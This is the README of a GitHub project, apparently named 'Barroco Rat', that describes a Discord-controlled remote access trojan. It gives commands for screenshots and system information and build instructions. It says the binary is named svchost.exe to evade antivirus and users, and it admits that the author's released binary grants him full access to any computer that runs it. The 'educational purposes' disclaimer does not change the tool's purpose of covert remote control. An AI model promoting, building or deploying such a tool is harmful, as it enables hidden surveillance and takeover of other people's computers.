# Barroco Rat

Barroco is a discord bot that is used to control a remote computer. It is a python script that is used to control a remote computer.

## Features

Control multiple devices with single discord account and directly in discord.

## Commands

help - Show list of commands\
sysinfo - Show system information\
ss - Screenshot the target device\

> [!WARNING]
> To run a command, you need to be in the same channel as the target device selected and you need to use the prefix of the target device + the command like `qft!sysinfo`

## How to compile

>[!WARNING]
> You need to have Python3 installed in your machine.

> [!IMPORTANT]
> You need to set the BOT_TOKEN environment variable before compiling.
> ```bash
> export BOT_TOKEN="your_token"
> ```
> or in windows cmd
> ```cmd
> set BOT_TOKEN="your_token"
> ```

1. Compile the bot 
```bash
make build
```
or in windows cmd
```cmd
build.bat
```

and then you will get the `svchost.exe` in the dist folder.

## Why svchost.exe?

We named it `svchost.exe` to avoid getting detected by antivirus software and people.

## How to use

Just run and be happy :)

## Warning
To avoid future problems, I am **NOT** responsible for any damage caused by this bot, only the user who runs this bot is responsible for any damage caused by this bot, this project is for educational purposes only.

> [!WARNING]
> Do not use this bot for malicious purposes, it is illegal and unethical.

> [!IMPORTANT]
> Don't run the svchost.exe file that I provide on release tab in this github repo, the svchost.exe that I put on the release tab is linked with my personal bot and I use the releases tab to update my bot automatically, so please, don't use, if you will, you will gave me full access to your computer and I'm not responsible for anything that happens to your computer.

## ToDo
- [ ] Auto-Updater via Github
- [ ] Add file manager (upload, download, list, delete, create folders, etc.)



